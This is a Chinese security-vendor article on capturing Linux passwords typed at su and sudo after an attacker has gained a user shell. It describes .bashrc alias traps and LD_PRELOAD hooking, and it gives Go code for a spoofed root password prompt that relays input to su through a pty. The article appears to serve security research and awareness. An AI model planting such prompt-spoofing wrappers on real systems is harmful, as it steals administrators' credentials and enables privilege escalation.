---
title: 通用Linux系统密码劫持记录研究总结
url: https://mp.weixin.qq.com/s?__biz=MzUzMDUxNTE1Mw==&mid=2247508739&idx=1&sn=85cfd0593b33c052df36c3e7726185d2&chksm=fa5276bdcd25ffabb5a7eac6281f251c7613cef871ef960b53a17575b6631ee4938033ada589&scene=58&subscene=0#rd
source: 山石网科安全技术研究院
date: 2024-11-21
fetch_date: 2025-10-06T19:17:06.219152
---

# 通用Linux系统密码劫持记录研究总结

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/Gw8FuwXLJnRkZMLcS7k4BSFH1T19egV7tR1tjQjSBCSeo27nmGoxr10jALj1d9iazx2x6acvX0mEIQd6A2ic9FEQ/0?wx_fmt=jpeg)

# 通用Linux系统密码劫持记录研究总结

原创

samy

山石网科安全技术研究院

### 什么是密码劫持？

记录任何在终端中输入的密码，包括使用`su`、`sudo`、`ssh`等命令时输入的密码。

具体原理如下：

1. 终端拦截：作为一个中介程序插入到终端与其他程序之间。当用户在终端中输入密码时,能够捕获这些输入。
2. 环境变量和别名：

* 通过设置环境变量或在`.bashrc`中添加别名可以替代常用命令（如`sudo`）执行，从而记录用户输入的密码。
* 如果用户调用`sudo`，实际上会运行Subtty，这样Subtty可以记录后续输入。

3. 使用LD\_PRELOAD：可以作为一个共享库，利用`LD_PRELOAD`技术挂载到系统中。这使得它可以拦截标准库调用（如`execv`），在执行原程序之前，先通过Subtty处理输入，从而实现记录。
4. 日志记录：捕获到的密码会被记录到文件中，方便后续查看。

假设我们获取了一个普通用户nick的shell，在.bashrc在添加sudo 或su的别名：

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnRkZMLcS7k4BSFH1T19egV7P7MjnAFdzQ6ic0j4pOuLtE0EWwq5aK4edcXE17MibuAH7lbBmWAIrneA/640?wx_fmt=png&from=appmsg)

管理员登入这台主机使用sudo、su命令时切换到root时，记录管理员输入的密码。

![](https://mmbiz.qpic.cn/mmbiz_gif/Gw8FuwXLJnRkZMLcS7k4BSFH1T19egV769AaNVp6bGXOxATlygQAblWY96OVbkBiaDtk2qUJqczASfszYNf9e2w/640?wx_fmt=gif&from=appmsg)

下面的代码 ，创建一个伪终端（pty）来执行 `su -` 命令，并将用户输入的密码或命令输出分别转发到伪终端和主终端：

```
package main

import (
    "fmt"
    "io"
    "os"
    "os/exec"
    "golang.org/x/crypto/ssh/terminal"
    "github.com/creack/pty"
)

const maxRetries = 3

func main() {
    // 获取终端文件描述符
    fd := int(os.Stdin.Fd())

    // 设置终端为原始模式
    oldState, err := terminal.MakeRaw(fd)
    if err != nil {
        fmt.Println("Error setting terminal to raw mode:", err)
        return
    }
    defer terminal.Restore(fd, oldState) // 恢复终端状态

    for retries := 0; retries < maxRetries; retries++ {
        // 提示用户输入密码
        fmt.Print("Password for root: ")
        password, err := terminal.ReadPassword(fd)
        fmt.Println() // 打印换行，保持输出美观
        if err != nil {
            fmt.Println("Error reading password:", err)
            return
        }

        // 创建 su 命令
        cmd := exec.Command("su", "-")

        // 创建伪终端
        pty, err := pty.Start(cmd)
        if err != nil {
            fmt.Println("Error starting pty:", err)
            return
        }
        defer pty.Close()

        // 将密码写入 pty
        if _, err := pty.Write(append(password, '\n')); err != nil {
            fmt.Println("Error writing password to pty:", err)
            return
        }

        // 将 pty 的输出转发到主终端
        go func() {
            _, err := io.Copy(os.Stdout, pty)
            if err != nil {
                fmt.Println("Error copying from pty to stdout:", err)
            }
        }()

        // 将主终端输入输出连接到伪终端
        go func() {
            _, err := io.Copy(pty, os.Stdin) // 将用户输入转发到 pty
            if err != nil {
                fmt.Println("Error copying from stdin to pty:", err)
            }
        }()

        // 等待命令执行完成
        if err := cmd.Wait(); err != nil {
            if retries == maxRetries-1 {
                fmt.Println("Maximum retry attempts reached. Exiting.")
                return
            }
            fmt.Println("Incorrect password. Please try again.")
            continue // 输入错误，重新提示输入密码
        }

        fmt.Println("Successfully switched to root user")
        return // 成功切换后退出循环
    }
}
```

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnSZmibNONzibea8WkcAFcdQcXicIYgWuvOtR8HqlqJ68Avib679FBGHYqxRibldppr6etXJxxWRrlBToiaw/0?wx_fmt=png)

山石网科安全技术研究院

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnSZmibNONzibea8WkcAFcdQcXicIYgWuvOtR8HqlqJ68Avib679FBGHYqxRibldppr6etXJxxWRrlBToiaw/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过